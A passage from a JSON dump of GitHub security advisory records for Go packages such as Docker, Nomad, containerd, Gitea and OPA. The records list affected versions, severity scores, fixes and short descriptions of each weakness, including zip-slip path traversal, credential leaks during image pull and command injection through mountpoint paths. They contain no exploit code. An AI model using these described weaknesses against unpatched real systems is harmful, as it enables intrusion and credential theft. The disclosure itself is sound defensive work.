"id": "GHSA-g9mp-8g3h-3c5c", "modified": "2023-08-29T20:07:14Z", "published": "2022-02-15T01:57:18Z", "aliases": [], "summary": "flynn/noise has improper nonce handling yielding potential state DoS", "details": "The Go package `github.com/flynn/noise`, a [Noise Protocol](https://noiseprotocol.org/) implementation, has two bugs in nonce handling in versions prior to v1.0.0.\n\n### Issue 1: Potential nonce overflow\n\nIf 2<sup>64</sup> (~18.4 quintillion) or more messages are encrypted with `Encrypt` after handshaking, the nonce counter will wrap around, causing multiple messages to be encrypted with the same key and nonce, resulting in a potentially catastrophic weakening of the security properties of the symmetric cipher.\n\nThis has been resolved in the patched version by returning `ErrMaxNonce` from the `CipherState` `Encrypt` and `Decrypt` methods before the reserved maximum nonce is reached. If this error is encountered, the program should handshake again to start with a fresh `CipherState`.\n\n### Issue 2: Potential denial of service via invalid ciphertext\n\nIf an attacker sends an invalid ciphertext into one peer's `Decrypt`, the nonce is incremented unconditionally. This causes a desync of the `CipherState` due to a nonce mismatch between the peers, resulting in a failure to decrypt all subsequent messages. A new handshake will be required to establish a new `CipherState`.\n\nThis has been resolved in the patched version by returning authentication errors from `Decrypt` before incrementing the nonce. \n\n### Patches\n\nFixed in https://github.com/flynn/noise/pull/44, tagged as v1.0.0.\n\n### Acknowledgements\n\nThese issues were discovered during [an audit](https://www.bamsoftware.com/software/dnstt/cure53-turbotunnel-2021.pdf) of a user of this package ([dnstt](https://www.bamsoftware.com/software/dnstt/)). Thanks to UC Berkley for commissioning the audit, and to David Fifield and Nathan Brown for their collaboration on the fixes. The fixed issues are noted in the audit as:\n\n* UCB-02-003 Potential nonce overflow in Noise protocol\n* UCB-02-006 DoS due to unconditional nonce increment", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/flynn/noise"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/flynn/noise/security/advisories/GHSA-g9mp-8g3h-3c5c"}, {"type": "WEB", "url": "https://github.com/flynn/noise/pull/44"}, {"type": "PACKAGE", "url": "https://github.com/flynn/noise"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0425"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-18T21:46:19Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5qgp-p5jc-w2rm", "modified": "2021-05-20T21:03:55Z", "published": "2022-02-15T00:41:12Z", "aliases": ["CVE-2014-6407"], "summary": "Arbitrary Code Execution in Docker", "details": "Docker before 1.3.2 allows remote attackers to write to arbitrary files and execute arbitrary code via a (1) symlink or (2) hard link attack in an image archive in a (a) pull or (b) load operation.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6407"}, {"type": "WEB", "url": "https://github.com/docker/docker/commit/3ac6394b8082d4700483d52fbfe54914be537d9e"}, {"type": "WEB", "url": "https://docs.docker.com/v1.3/release-notes/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/pipermail/package-announce/2014-December/145154.html"}, {"type": "WEB", "url": "https://lists.opensuse.org/opensuse-security-announce/2014-12/msg00009.html"}, {"type": "WEB", "url": "https://secunia.com/advisories/60171"}, {"type": "WEB", "url": "https://secunia.com/advisories/60241"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6407"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2014/11/24/5"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:03:55Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-gwmc-6795-qghj", "modified": "2022-03-18T18:21:52Z", "published": "2022-02-15T00:02:46Z", "aliases": ["CVE-2022-24686"], "summary": "HashiCorp Nomad Artifact Download Race Condition", "details": "HashiCorp Nomad and Nomad Enterprise 0.3.0 through 1.0.17, 1.1.11, and 1.2.5 artifact download functionality has a race condition such that the Nomad client agent could download the wrong artifact into the wrong destination. This issue is fixed in 1.0.18, 1.1.12, and 1.2.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.0"}, {"fixed": "1.0.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24686"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/issues/12036"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-01-nomad-artifact-download-race-condition/35559"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/releases/tag/v1.2.6"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220318-0008/"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-18T18:21:52Z", "nvd_published_at": "2022-02-14T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8m9g-647g-5pxw", "modified": "2021-05-07T16:04:45Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-28484"], "summary": "Infinite loop in Yubico yubihsm-connector", "details": "An issue was discovered in the /api/connector endpoint handler in Yubico yubihsm-connector before 3.0.1 (in YubiHSM SDK before 2021.04). The handler did not validate the length of the request, which can lead to a state where yubihsm-connector becomes stuck in a loop waiting for the YubiHSM to send it data, preventing any further operations until the yubihsm-connector is restarted. An attacker can send 0, 1, or 2 bytes to trigger this.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:U/RL:O/RC:R"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/Yubico/yubihsm-connector"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-28484"}, {"type": "WEB", "url": "https://github.com/Yubico/yubihsm-connector/commit/82bdf202c53460bac9106cc9b4b34a0a16cae0ed"}, {"type": "WEB", "url": "https://github.com/Yubico/yubihsm-connector/releases"}, {"type": "WEB", "url": "https://www.yubico.com/support/security-advisories/ysa-2021-02/"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-07T16:04:45Z", "nvd_published_at": "2021-04-14T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jh6m-3pqw-242h", "modified": "2022-08-12T20:52:13Z", "published": "2022-02-09T00:56:04Z", "aliases": ["CVE-2020-14359"], "summary": "Keycloak Gatekeeper vulnerable to bypass on using lower case HTTP headers", "details": "A vulnerability was found in all versions of the deprecated package Keycloak Gatekeeper, where on using lower case HTTP headers (via cURL) we can bypass our Gatekeeper. Lower case headers are also accepted by some webservers (e.g. Jetty). This means there is no protection when we put a Gatekeeper in front of a Jetty server and use lowercase headers.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/keycloak/keycloak-gatekeeper"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.2.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14359"}, {"type": "WEB", "url": "https://github.com/keycloak/keycloak/issues/12934"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1868591"}, {"type": "PACKAGE", "url": "https://github.com/keycloak/keycloak-gatekeeper"}, {"type": "WEB", "url": "https://issues.jboss.org/browse/KEYCLOAK-14090"}, {"type": "WEB", "url": "https://web.archive.org/web/20190613000352/github.com/keycloak/keycloak-gatekeeper"}], "database_specific": {"cwe_ids": ["CWE-305"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-04-01T16:13:00Z", "nvd_published_at": "2021-02-23T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q47x-6mqq-4w92", "modified": "2023-10-02T11:51:23Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-11228"], "summary": "Gitea Improper Input Validation", "details": "repo/setting.go in Gitea before 1.7.6 and 1.8.x before 1.8-RC3 does not validate the `form.MirrorAddress` before calling `SaveAddress`.\n\n### Specific Go Packages Affected\ngithub.com/go-gitea/gitea/models", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11228"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/6593"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/6595"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases/tag/v1.7.6"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases/tag/v1.8.0-rc3"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:07:46Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-vc3x-gx6c-g99f", "modified": "2023-02-07T22:07:35Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-18206"], "summary": "Denial of Service in Bytom", "details": "In the client in Bytom before 1.0.6, checkTopicRegister in p2p/discover/net.go does not prevent negative idx values, leading to a crash.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bytom/bytom"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-18206"}, {"type": "WEB", "url": "https://github.com/Bytom/bytom/pull/1307"}, {"type": "WEB", "url": "https://github.com/Bytom/bytom/commit/1ac3c8ac4f2b1e1df9675228290bda6b9586ba42"}, {"type": "PACKAGE", "url": "https://github.com/Bytom/bytom"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0079"}], "database_specific": {"cwe_ids": ["CWE-190"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T18:55:02Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5wmg-j84w-4jj4", "modified": "2022-07-16T04:26:05Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-1002207"], "summary": "Arbitrary File Write via Archive Extraction in mholt/archiver", "details": "mholt/archiver golang package before e4ef56d48eb029648b0e895bb0b6a393ef0829c3 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in an archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mholt/archiver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1002207"}, {"type": "WEB", "url": "https://github.com/mholt/archiver/pull/65"}, {"type": "WEB", "url": "https://github.com/mholt/archiver/commit/e4ef56d48eb029648b0e895bb0b6a393ef0829c3"}, {"type": "PACKAGE", "url": "https://github.com/mholt/archiver"}, {"type": "WEB", "url": "https://github.com/snyk/zip-slip-vulnerability"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVERCMDARCHIVER-50071"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:56:29Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-h2x7-2ff6-v32p", "modified": "2023-08-30T18:02:56Z", "published": "2022-02-11T23:39:57Z", "aliases": [], "summary": "gobase subject to Incorrect routing of some HTTP requests when using httpauth due to a race condition", "details": "### Impact\nIncorrect routing of some HTTP requests when using httpauth due to a race condition\n\n### Patches\nUpgrade to version 0.7.2 for fix\n\n### Workarounds\nNone\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [nbosscher@blue-giraffe.ca](mailto:nbosscher@blue-giraffe.ca)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ntbosscher/gobase"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ntbosscher/gobase/security/advisories/GHSA-h2x7-2ff6-v32p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2583"}, {"type": "WEB", "url": "https://github.com/ntbosscher/gobase/commit/a8d40bce9c429d324122d18c446924dab809e812"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0400"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:08:26Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wxjg-p59j-6c92", "modified": "2022-03-08T18:26:50Z", "published": "2022-02-26T00:00:44Z", "aliases": ["CVE-2022-25328"], "summary": "Command injection in github.com/google/fscrypt", "details": "The bash_completion script for fscrypt allows injection of commands via crafted mountpoint paths, allowing privilege escalation under a specific set of circumstances. A local user who has control over mountpoint paths could potentially escalate their privileges if they create a malicious mountpoint path and if the system administrator happens to be using the fscrypt bash completion script to complete mountpoint paths. We recommend upgrading to version 0.3.3 or above", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/fscrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25328"}, {"type": "WEB", "url": "https://github.com/google/fscrypt/pull/346"}, {"type": "PACKAGE", "url": "https://github.com/google/fscrypt/"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T19:30:03Z", "nvd_published_at": "2022-02-25T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6jm6-cmcp-fqjq", "modified": "2022-04-04T20:33:50Z", "published": "2022-02-16T00:01:42Z", "aliases": ["CVE-2022-24684"], "summary": "Nomad Spread Job Stanza May Trigger Panic in Servers", "details": "Nomad and Nomad Enterprise allows operators with job-submit capabilities to use the spread stanza in a way such that it can cause panic in Nomad servers. This vulnerability, CVE-2022-24684, was fixed in Nomad 1.0.18, 1.1.12, and 1.2.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "1.0.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24684"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-04-nomad-spread-job-stanza-may-trigger-panic-in-servers/"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-04-nomad-spread-job-stanza-may-trigger-panic-in-servers/35562"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220318-0008/"}, {"type": "PACKAGE", "url": "https://www.github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-04T20:33:50Z", "nvd_published_at": "2022-02-15T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wf43-55jj-vwq8", "modified": "2021-05-19T22:09:57Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-1099"], "summary": "DNS Rebinding in etcd", "details": "DNS rebinding vulnerability found in etcd 3.3.1 and earlier. An attacker can control his DNS records to direct to localhost, and trick the browser into sending requests to localhost (or any other address).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.4.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1099"}, {"type": "WEB", "url": "https://github.com/coreos/etcd/issues/9353"}, {"type": "WEB", "url": "https://github.com/coreos/etcd/commit/a7e5790c82039945639798ae9a3289fe787f5e56"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1552717"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JX7QTIT465BQGRGNCE74RATRQLKT2QE4/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UPGYHMSKDPW5GAMI7BEP3XQRVRLLBJKS/"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-350"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:09:57Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-hcw3-j74m-qc58", "modified": "2022-02-23T22:04:25Z", "published": "2022-02-09T22:17:37Z", "aliases": ["CVE-2022-23628"], "summary": "Incorrect Calculation in github.com/open-policy-agent/opa", "details": "### Impact\n\nUnder certain conditions, pretty-printing an AST that contains synthetic nodes could change the logic of some statements by reordering array literals. Example of policies impacted are those that parse and compare web paths, see the example below.\n\n**All of these** three conditions have to be met to create an adverse effect:\n\n1. An AST of Rego had to be **created programmatically** such that it ends up containing terms without a location (such as wildcard variables).\n2. The AST had to be **pretty-printed** using the `github.com/open-policy-agent/opa/format` package.\n3. The result of the pretty-printing had to be **parsed and evaluated again** via an OPA instance using the bundles, or the Golang packages.\n\nIf any of these three conditions are not met, you are not affected.\n\nNotably, all three would be true if using **optimized bundles**, i.e. bundles created with `opa build -O=1` or higher.\nIn that case, the optimizer would fulfil condition (1.), the result of that would be pretty-printed when writing the bundle to disk, fulfilling (2.). When the bundle was then used, we'd satisfy (3.).\n\n#### Example\nFor example, the process outlined above could turn \nthis rule\n```rego\nhello {\n\t[\"foo\", _] = split(input.resource, \"/\")\n}\n```\n\ninto\n```rego\nhello {\n\t[_, \"foo\"] = split(input.resource, \"/\")\n}\n```\n\nwith an input of\n```rego\n{\n    \"resource\": \"foo/bar\"\n}\n```\n\nthe result would change from\n```rego\n{\n    \"hello\": true\n}\n```\nto (no default value of hello)\n```rego\n{}\n```\n\nThe severity was determined to be *moderate* because the conditions are quite particular. Please note that its only the OPA bundle build process thats affected. An OPA sidecar of version 0.36.0 with an optimized bundle built by OPA 0.32.1 would not face this bug.\n\n### Patches\n\nFixed in version 0.37.2.\n\n### Workarounds\n\n- Disabling optimization when creating bundles.\n\n### References\n\n- Introduced in https://github.com/open-policy-agent/opa/pull/3851\n- Backported for the 0.33.1 patch release: https://github.com/open-policy-agent/opa/commit/bfd984ddf93ef2c4963a08d4fdadae0bcf1a3717\n- Fixed by https://github.com/open-policy-agent/opa/commit/932e4ffc37a590ace79e9b75ca4340288c220239 and https://github.com/open-policy-agent/opa/commit/2bd8edab9e10e2dc9cf76ae8335ced0c224f3055\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [Community Discussions](https://github.com/open-policy-agent/community/discussions/categories/opa-and-rego)\n* Ask in Slack: https://slack.openpolicyagent.org/", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/open-policy-agent/opa"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.33.1"}, {"fixed": "0.37.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/open-policy-agent/opa/security/advisories/GHSA-hcw3-j74m-qc58"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23628"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/pull/3851"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/commit/2bd8edab9e10e2dc9cf76ae8335ced0c224f3055"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/commit/932e4ffc37a590ace79e9b75ca4340288c220239"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/commit/bfd984ddf93ef2c4963a08d4fdadae0bcf1a3717"}, {"type": "PACKAGE", "url": "https://github.com/open-policy-agent/opa"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0316"}], "database_specific": {"cwe_ids": ["CWE-682"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-09T22:17:37Z", "nvd_published_at": "2022-02-09T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-877x-32pm-p28x", "modified": "2021-05-13T19:28:33Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-2026"], "summary": "Link Following in Kata Runtime", "details": "A malicious guest compromised before a container creation (e.g. a malicious guest image or a guest running multiple containers) can trick the kata runtime into mounting the untrusted container filesystem on any host path, potentially allowing for code execution on the host. This issue affects Kata Containers 1.11 versions earlier than 1.11.1; Kata Containers 1.10 versions earlier than 1.10.5; Kata Containers 1.9 and earlier versions.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kata-containers/runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9"}}, {"package": {"ecosystem": "Go", "name": "github.com/kata-containers/runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/kata-containers/runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}], "versions": ["1.11.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-2026"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/issues/2712"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/pull/2713"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/releases/tag/1.10.5"}, {"type": "WEB", "url": "https://github.com/kata-containers/runtime/releases/tag/1.11.1"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2P7FHA4AF6Y6PAVJBTTQPUEHXZQUOF3P/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6JPBKAQBF3OR72N55GWM2TDYQP2OHK6H/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6W5MKF7HSAIL2AX2BX6RV4WWVGUIKVLS/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NJAMOVB7DSOGX7J26QH5HZKU7GSSX2VU/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QNJHSSPCKUGJDVXXIXK2JUWCRJDQX7CE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWACJQSMY5BVDMVTF3FBN7HZSOSFOG3Q/"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-13T19:28:33Z", "nvd_published_at": "2020-06-10T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-57q7-rxqq-7vgp", "modified": "2021-05-18T21:39:10Z", "published": "2022-02-15T01:57:18Z", "aliases": [], "summary": "On Windows, `git-sizer` might run a `git` executable within the repository being analyzed", "details": "### Impact\nOn Windows, if `git-sizer` is run against a non-bare repository, and that repository has an executable called `git.exe`, `git.bat`, etc., then that executable might be run by `git-sizer` rather than the system `git` executable. An attacker could try to use social engineering to get a victim to run `git-sizer` against a hostile repository and thereby get the victim to run arbitrary code.\n\nOn Linux or other Unix-derived platforms, a similar problem could occur if the user's `PATH` has the current directory before the path to the standard `git` executable, but this is would be a very unusual configuration that has been known for decades to lead to all kinds of security problems.\n\n### Patches\nUsers should update to git-sizer v1.4.0\n\n### Workarounds\nIf you are on Windows, then either\n* Don't run `git-sizer` against a repository that might contain hostile code, or, if you must\u2026\n* Run `git-sizer` against a bare clone of the hostile repository, or, if that is not possible\u2026\n* Make sure that the hostile repository doesn't have an executable in its top-level directory before running `git-sizer`.\n\nIf you are on Linux or other Unix-based system, then (for myriad reasons!) don't add the current directory to your `PATH`.\n\n### References\n* [Command PATH security in Go](https://blog.golang.org/path-security)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the `git-sizer` project](https://github.com/github/git-sizer).\n* Email us at [GitHub support](mailto:support@github.com).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/github/git-sizer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.3.0"}}], "references": [{"type": "WEB", "url": "https://github.com/github/git-sizer/security/advisories/GHSA-57q7-rxqq-7vgp"}, {"type": "WEB", "url": "https://github.com/github/git-sizer/commit/38400d6ddd79325e956b00ff584cfcc8dd96d536"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-18T21:39:10Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-742w-89gc-8m9c", "modified": "2022-02-11T23:27:39Z", "published": "2022-02-11T23:27:39Z", "aliases": ["CVE-2020-15157"], "summary": "containerd v1.2.x can be coerced into leaking credentials during image pull", "details": "## Impact\n\nIf a container image manifest in the OCI Image format or Docker Image V2 Schema 2 format includes a URL for the location of a specific image layer (otherwise known as a \u201cforeign layer\u201d), the default containerd resolver will follow that URL to attempt to download it. In v1.2.x but not 1.3.0 or later, the default containerd resolver will provide its authentication credentials if the server where the URL is located presents an HTTP 401 status code along with registry-specific HTTP headers.\n\nIf an attacker publishes a public image with a manifest that directs one of the layers to be fetched from a web server they control and they trick a user or system into pulling the image, they can obtain the credentials used for pulling that image. In some cases, this may be the user's username and password for the registry. In other cases, this may be the credentials attached to the cloud virtual instance which can grant access to other cloud resources in the account.\n\nThe default containerd resolver is used by the cri-containerd plugin (which can be used by Kubernetes), the ctr development tool, and other client programs that have explicitly linked against it.\n\nThis vulnerability has been rated by the containerd maintainers as medium, with a CVSS score of 6.1 and a vector string of CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N.\n\n## Patches\n\nThis vulnerability has been fixed in containerd 1.2.14.  containerd 1.3 and later are not affected.\n\n## Workarounds\n\nIf you are using containerd 1.3 or later, you are not affected.  If you are using cri-containerd in the 1.2 series or prior, you should ensure you only pull images from trusted sources.  Other container runtimes built on top of containerd but not using the default resolver (such as Docker) are not affected.\n\n## Credits\n\nThe containerd 